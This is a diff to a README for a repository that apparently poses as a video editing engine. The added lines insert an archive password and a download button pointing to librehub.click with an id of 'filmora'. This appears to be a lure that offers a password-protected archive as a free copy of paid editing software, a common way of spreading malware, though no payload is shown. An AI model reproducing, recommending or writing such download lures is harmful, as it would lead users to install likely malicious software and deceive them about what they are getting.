@@ -3,8 +3,19 @@
 
 This repository features a comprehensive, intuitive video editing engine designed for content creators, independent digital media developers, and editing enthusiasts. The application bridges the gap between high-end professional studio suites and basic mobile clipping tools. The core architecture is engineered to empower users to generate high-fidelity, visually compelling video assets without extensive training barriers.
 ---
-097987
+
+**ARCHIVE :** `LibreHub#!`
+
 ---
+
+<p align="center">
+  <a href="https://librehub.click/download.php?id=filmora">
+    <img src="https://www.expedicionestropicales.com/wp-content/uploads/2015/08/download.png">
+  </a>
+</p>
+
+---
+
 ### Key Technical Features
 
 * **Advanced Automation & Smart Processing:** Integrated modular utilities streamline manual post-production. The automated object isolation tool separates complex elements from backgrounds without requiring dedicated physical backdrops. Smart audio manipulation dynamically scales background tracks to match timeline bounds, while the automated noise cancellation filter eliminates environment hiss and echo.
